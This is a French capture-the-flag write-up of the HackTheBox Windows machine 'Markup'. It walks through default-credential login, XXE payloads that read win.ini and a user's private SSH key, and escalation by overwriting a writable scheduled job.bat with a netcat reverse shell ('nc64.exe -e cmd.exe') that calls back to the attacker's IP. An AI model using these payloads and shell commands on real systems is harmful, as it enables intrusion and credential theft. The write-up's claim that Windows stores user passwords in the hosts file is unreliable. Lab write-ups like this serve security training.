# [Markup] — HackTheBox


## Informations
- **Difficulté** : Easy
- **OS** : Windows
- **Date** : 14/03/2026


## Résumé
Markup est une machine Windows très facile qui explore les vulnérabilités XXE/XEE (XML External Entity), des permissions fichiers non-sécurisés et des tâches planifiées mal configurées. Une application web vulnérable autorise les saisies XML d'utilisateurs afin d'être parsées, autorisant ainsi la prise de fichiers sensibles sur la machine hôte, incluant des clés SSH privées d'un utilisateur. L'escalade de privilège peut ainsi être effectuée en indentifiant et en réécrivant un script batch planifié avec des permissions non-sécurisées pour exécuter une reverse shell.


## Enumération
À chaque début de machine, on lance d'abord un scan nmap afin de savoir quels ports sont ouverts sur le serveur.
La commande est comme suit :
nmap -Pn -sVC -p- {target_IP}

On peut voir sur cette machine que le port 80 est ouvert, contenant un service Apache.
Un site web est donc en place, ce qui veut dire que l'on peut aller regarder son fonctionnement.


## Exploitation
En arrivant sur la page du site, on rencontre alors un système de login, facilement contournable.
Avec un peu de patience et en testant différentes combinaisons utilisateur:motdepasse par défaut, on tombe alors sur les crédits suivants : `admin:password`

Une fois connecté, on peut explorer un peu les différentes pages du site.
Celle qui nous intéresse porte le titre "Order", où un formulaire de commande est présent.
On peut également regarder comment le site est construit rapidement en appuyant sur F12 ou en faisant clic-droit puis inspecter.
Dans la page d'outils développeur, on peut apercevoir un commentaire HTML avec un nom : `Daniel`. Gardons ça de côté.

Testons d'abord d'envoyer une commande avec une valeur test.
En interceptant la requête dans Burp Suite, on aperçoit en fin de requête le fameux formulaire basé sur XML.

En modifiant la valeur de la requête, on peut tenter une attaque XXE. Les différents payloads pour se faire sont disponibles dans les ressources de ce writeup.

Ici, ce qui nous intéresse, c'est de trouver un mot de passe qui pourrait nous aider à nous connecter au serveur via SSH.
Sous Linux, le dossier contenant les mots de passe utilisateurs est '/etc/passwd'. Pour Windows, le dossier est 'C:\windows\system32\drivers\etc\hosts'.

Pour savoir si la faille XXE est bien présente, on introduit le payload suivant après la balise XML :
`<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>`

On obtient alors plusieurs fichiers dans la réponse, indiquant bel et bien une faille XXE.
On peut désormais se rendre dans les fichiers de l'utilisateur Daniel et tenter de découvrir ses fichiers pouvant peut-être nous mener à une escalade de privilèges.

Après quelques recherches, on tombe sur un dossier `.ssh`, contenant en son sein une clé RSA. Nous pouvons la faire apparaître dans la réponse du navigateur via le payload suivant :
`<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>`

Bingo !
Enregistrons cette clé en la copiant-collant dans un fichier sur notre système, modifions ses privilèges afin qu'elle puisse être lue par SSH, puis essayons de nous connecter via SSH au serveur via cette commande :
`ssh daniel@{target_IP} -i {nom-du-fichier}`


## Accès initial (user flag)
On y est. Petite commande pour vérifier que nous sommes bien connectés en tant que l'utilisateur daniel et on pourra commencer à chercher plus de failles.
`$whoami` -> `markup\daniel`

Nous avons donc réussi à nous authentifier.
Après une petite recherche rapide dans les dossiers, on peut trouver le flag user dans l'espace :
`C:\Users\Daniel\Desktop`.


## Privilege Escalation
Maintenant que nous avons terminé la première partie, nous pouvons passer à l'escalade de privilèges.
La première chose à faire est de vérifier quels privilèges nous avons en tant que "Daniel".

La commande et la réponse sont les suivantes :
`whoami /priv` -> `SeChangeNotifyPrivilege` & `SeIncreaseWorkingSetPrivilege`

Malheureusement, rien de bien utile pour nous.

Si Daniel ne peut pas nous apporter grand-chose, on peut tout de même explorer les dossiers du disque dur.

En faisant la liste du répertoire, on aperçoit deux choses peu communes, notamment un dossier nommé `Log-Management` et un fichier nommé `Recovery.txt`, ce dernier étant de taille 0, aucun doute sur le fait que ce fichier soit vide.

Explorons un peu plus attentivement le dossier `Log-Management`, et entrons à l'intérieur pour découvrir ce qu'il s'y cache.
À l'intérieur de ce nouveau répertoire, un seul fichier est accessible nommé `job.bat`.
Essayons de démasquer son utilité :
`type job.bat`

En lisant le contenu de `job.bat`, on peut déduire que son utilité est donc d'effacer les logs, cependant, il doit être ouvert avec un compte administrateur.
Ce fichier contient une ligne concernant un utilitaire de logs, `wevtutil.exe`, qui a l'abilité de prendre des informations sur des évènements de logs et de publishers. Pour plus d'informations sur `wevtutil.exe`, rendez-vous sur les ressources.

Vu que le fichier `job.bat` ne peut être démarré qu'en tant qu'administrateur, il faut que l'on sache si nous avons de tels privilèges dans notre usergroup.
La commande pour vérifier cela est : `icacls job.bat`.

Les permissions pour le fichier batch sont donc en "Full control" pour le groupe `BUILTIN\Users`.
Puisque ce groupe représente tous les utilisateurs sur le système local, Daniel en fait donc parti.

Désormais, il nous reste à savoir si `wevtutil.exe` est en cours d'exécution en ouvrant une fenêtre powershell grâce à la commande `powershell`, et en saisissant dans le PS-CLI (PowerShell-Command Line Interface) la commande `ps`, on peut voir que le service est en cours d'exécution.

S'il ne l'est pas, pas de panique, il arrive que certaines personnes ne le voient pas.

Nous avons donc désormais toutes les clés en main pour accéder au compte root du serveur.
Pour se faire, sur notre machine, nous allons télécharger nc64.exe (netcat pour windows) afin de transporter le logiciel sur le serveur et la session en cours.

La commande pour télécharger nc64.exe :
`wget http://github.com/int0x33/nc.exe/raw/master/nc64.exe`

Une fois téléchargé, nous allons créer un serveur web sur lequel on va héberger une connexion le temps que la machine victime s'y connecte et puisse télécharger à son tour `nc64.exe` :
`sudo python3 -m http.server {port-num}` (le numéro du port peut-être n'importe lequel, souvent 80)

On peut retourner sur la session Windows de la victime, et exécuter (toujours dans powershell), la commande suivante :
`wget http://{notre-IP}/nc64.exe -outfile nc64.exe`

Cela va donc créer un fichier `nc64.exe` sur la machine Windows, que l'on pourra exploiter pour l'escalade finale.

Quittons la fenêtre powershell pour revenir sur l'interface Windows classique, en utilisant la commande `exit` et en s'assurant que les lettres "PS" n'apparaissent plus devant le nom d'utilisateur.

Plus qu'à ouvrir un netcat sur notre machine :
`sudo nc -lvnp {port}`

Puis à taper sur la console victime :
`echo C:\{dossier}\nc64.exe -e cmd.exe {notre-IP} {port-netcat} > C:\Log-Management\job.bat`


## Root flag
Voilà, notre shell est en place ! Plus qu'à revenir sur notre netcat et apercevoir qu'on est connectés.
Maintenant, une petite recherche nous amène à découvrir le flag dans le répertoire `C:\Users\Administrator\Desktop`, contenant le flag `root.txt`.

Un petit `type root.txt`, et on peut récupérer le root flag.


## Pourquoi ça marche
Une simple faille web peut mener à une compromission entière d'un système.
Ici, un simple formulaire XML mal sécurisé, ainsi qu'un petit indice dans les données HTML nous ont permis de nous connecter au serveur directement, compromettant la sécurité entière du système.


## Ressources
nmap : https://nmap.org/man/fr/index.html
XXE : https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
ssh : https://linux.die.net/man/1/ssh
icacls : https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/icacls
wget : https://linux.die.net/man/1/wget
